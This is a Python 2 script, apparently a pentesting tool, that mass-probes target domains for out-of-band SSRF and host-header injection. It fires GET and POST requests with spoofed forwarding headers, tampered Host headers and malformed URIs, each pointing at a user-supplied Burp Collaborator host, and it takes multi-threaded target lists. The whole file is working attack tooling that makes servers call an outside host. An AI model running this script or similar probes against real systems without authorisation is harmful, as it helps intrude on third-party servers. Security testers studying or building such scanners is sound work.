import urllib
import optparse
import httplib
import os
import threadpool


def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@ua.%s.%s' % (domainName, collaboratorServerAddress)
    forwarded = 'for=spoofed.forwarded.%s.%s;by=spoofed.forwarded.%s.%s;host=spoofed.forwarded.%s.%s' % (domainName, collaboratorServerAddress,domainName, collaboratorServerAddress,domainName, collaboratorServerAddress)
    x_forwarded_for = 'spoofed.xforwardedfor.%s.%s' % (domainName, collaboratorServerAddress)
    contact = 'root@contact.%s.%s' % (domainName, collaboratorServerAddress)
    from1 = 'root@from.%s.%s' % (domainName, collaboratorServerAddress)
    x_wap_profile = 'http://xwapprofile.%s.%s' % (domainName, collaboratorServerAddress)
    x_originating_ip = 'spoofed.xoriginatingip.%s.%s' % (domainName, collaboratorServerAddress)
    client_ip = 'spoofed.clientip.%s.%s' % (domainName, collaboratorServerAddress)
    x_client_ip = 'spoofed.xclientip.%s.%s' % (domainName, collaboratorServerAddress)
    x_real_ip = 'spoofed.xrealip.%s.%s' % (domainName, collaboratorServerAddress)
    true_client_ip = 'spoofed.trueclientip.%s.%s' % (domainName, collaboratorServerAddress)
    referer = 'http://headername.%s.%s' % (domainName, collaboratorServerAddress)
    x_forwarded_host = 'xforwardedhost.%s.%s' % (domainName, collaboratorServerAddress)
    urls = 'postbody.%s.%s' % (domainName, collaboratorServerAddress)

    values = {'name': 'x-burp-collaboratorserver', 'url': urls}
    headers = {'User-Agent': user_agent, 'Connection': 'close', 'Cache-Control': 'no-transform','Forwarded': forwarded,
               'X-Forwarded-For': x_forwarded_for, 'Contact': contact,'From': from1, 'X-Wap-Profile': x_wap_profile,
               'X-Originating-IP': x_originating_ip,'Client-IP': client_ip, 'X-Client-IP': x_client_ip,'X-Real-IP': x_real_ip,
               'True-Client-IP': true_client_ip, 'Referer': referer,'X-Forwarded-Host': x_forwarded_host,'Progma': 'no-cache',
               'Cache-control': 'no-cache, no-transform'}
    data = urllib.urlencode(values)

    print '[!] GET method firing at %s with multi http headers ' % domainName
    conn = ''
    try:
        conn = httplib.HTTPConnection(domainName)
        conn.request("GET", "/", headers=headers)
        if verbose:
            print '[+] GET method using HTTP launch successed, response code is %s ' % conn.getresponse().status
    except:
        if verbose:
            print '[-] GET method using HTTP launch failed!'
        pass
    finally:
        conn.close()

    try:
        conn = httplib.HTTPSConnection(domainName)
        conn.request("GET", "/", headers=headers)
        if verbose:
            print '[+] GET method using HTTPS launch successed, response code is %s ' % conn.getresponse().status
    except:
        if verbose:
            print '[-] GET method using HTTPS launch failed!'
        pass
    finally:
        conn.close()

    print '[!] POST method firing at %s with multi http headers ' % domainName
    try:
        conn = httplib.HTTPConnection(domainName)
        conn.request("POST", '/', data, headers)
        if verbose:
            print '[+] POST method using HTTP launch successed, response code is %s ' % conn.getresponse().status
    except:
        if verbose:
            print '[-] POST method using HTTP launch failed!'
        pass
    finally:
        conn.close()

    try:
        conn = httplib.HTTPSConnection(domainName)
        conn.request("POST", "/", data, headers)
        if verbose:
            print '[+] POST method using HTTPS launch successed, response code is %s ' % conn.getresponse().status
    except:
        if verbose:
            print '[-] POST method using HTTPS launch failed!'
        pass
    finally:
        conn.close()


def modifyHostAndLaunch(domainName, collaboratorServerAddress, verbose):
    hosts =[]
    hosts.append("host1." + collaboratorServerAddress)
    hosts.append(domainName + "@" + "host2." + collaboratorServerAddress)
    hosts.append(domainName + ":@" + "host3." + collaboratorServerAddress)
    hosts.append(domainName + ":80@" "host4." + collaboratorServerAddress)
    hosts.append(domainName + ":443@" "host5." + collaboratorServerAddress)

    headers = []
    for host in hosts:
        headers.append({'Host': host, 'Progma': 'no-cache', 'Cache-control': 'no-cache, no-transform', 'Connection': 'close'})

    print '[!] Firing at %s with modified host header ' % domainName
    for header in headers:
        try:
            conn = httplib.HTTPConnection(domainName)
            conn.request("GET", "/", headers=header)
            if verbose:
                print '[+] Launch "Host: ' + str(header) + '" using HTTP successed, response code is %s' % conn.getresponse().status
            conn.close()
        except:
            if verbose:
                print '[-] Launch "Host: ' + str(header) + '" using HTTP failed'
            pass

        try:
            conn = httplib.HTTPSConnection(domainName)
            conn.request("GET", "/", headers=header)
            if verbose:
                print '[+] Launch "Host: ' + str(header) + '" using HTTPS successed, response code is %s' % conn.getresponse().status
            conn.close()
        except:
            if verbose:
                print '[-] Launch "Host: ' + str(header) + '" using HTTPS failed'
            pass


def malformedUriAndLaunch(domainName, collaboratorServerAddress, verbose):
    headers = {'Progma': 'no-cache', 'Cache-control': 'no-cache, no-transform', 'Connection': 'close', 'Host': domainName}
    httpUrls = []
    httpUrls.append("@mailformedUri1.%s" % collaboratorServerAddress)
    httpUrls.append(":@mailformeduUri2.%s" % collaboratorServerAddress)
    httpUrls.append('http://' + 'modifyUrl1.' + collaboratorServerAddress)
    httpUrls.append('http://' + domainName + "@" + 'modifyUrl2.' + collaboratorServerAddress)
    httpUrls.append('http://' + domainName + ":@" + 'modifyUrl3.' + collaboratorServerAddress)

    httpsUrls = []
    httpsUrls.append("@mailformedUri1.%s" % collaboratorServerAddress)
    httpsUrls.append(":@mailformeduUri2.%s" % collaboratorServerAddress)
    httpsUrls.append('https://' + 'modifyUrl1.' + collaboratorServerAddress)
    httpsUrls.append('https://' + domainName + "@" + 'modifyUrl2.' + collaboratorServerAddress)
    httpsUrls.append('https://' + domainName + ":@" + 'modifyUrl3.' + collaboratorServerAddress)


    print '[!] Firing at %s with Host overridding usring HTTP' % domainName
    for url in httpUrls:
        httpConn = httplib.HTTPConnection(domainName)
        try:
            httpConn.request("GET", url, headers=headers)
            if verbose:
                print '[+] Launch malformed uri : "' + url + '" using HTTP successed, response code is %s' % httpConn.getresponse().status
        except:
            if verbose:
                print '[-] Launch malformed uri : "' + url + '" using HTTP failed'
            pass
        finally:
            httpConn.close()


    print '[!] Firing at %s with Host overridding using HTTPS' % domainName
    for url in httpsUrls:
        httpsConn = httplib.HTTPSConnection(domainName)
        try:
            httpsConn.request("GET", url, headers=headers)
            if verbose:
                print '[+] Launch malformed uri : "' + url + '" using HTTPS successed, response code is %s' % httpsConn.getresponse().status
        except:
            if verbose:
                print '[-] Launch malformed uri : "' + url + '" using HTTPS failed'
            pass
        finally:
            httpsConn.close()


def armAndLaunch(domainName, collaboratorServerAddress, verbose):
    loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose)
    modifyHostAndLaunch(domainName, collaboratorServerAddress, verbose)
    malformedUriAndLaunch(domainName, collaboratorServerAddress, verbose)


def main():
    parser = optparse.OptionParser("usage: %prog [-h] [-d domain] [-f file] -c collboratorserver [-t threads] [-v verbose]")
    parser.add_option('-d', '--domain', dest='domain', type='string', help='Domain name to test')
    parser.add_option('-f', '--file', dest='file', type='string', help='File contains domain names')
    parser.add_option('-c', '--collaborator', dest='collaborator', type='string', help='Collaborator server address')
    parser.add_option('-t', '--threads', dest='threads', type='int', help='specify threads to run')
    parser.add_option('-v', '--verbose', dest='verbose', action='store_true', help='show verbose messages')
    (option, args) = parser.parse_args()

    domain = option.domain
    file = option.file
    coll = option.collaborator
    threads = option.threads

    if coll == None:
        print parser.usage
        exit(0)

    if domain == None and file == None:
        print 'File and Domain must specify at least one'
        exit(0)

    targets = []
    if domain != None:
        domains = domain.split(",")
        for do in domains:
            targets.append(do)

    if file != None:
        if os.path.exists(file):
            pass
        else:
            print '[-] File not exist, quitting...'
            exit(0)

        for line in open(file):
            targets.append(line.strip())

    flag = False
    if option.verbose != None:
        flag = True

    if threads == None:
        for target in targets:
            armAndLaunch(target, coll, flag)
    else:
        pool = threadpool.ThreadPool(threads)
        args = []
        for target in targets:
            temp = []
            temp.append(target)
            temp.append(coll)
            temp.append(flag)
            args.append((temp, None))
        requests = threadpool.makeRequests(armAndLaunch, args)
        [pool.putRequest(req) for req in requests]
        pool.wait()

if __name__ == '__main__':
    main()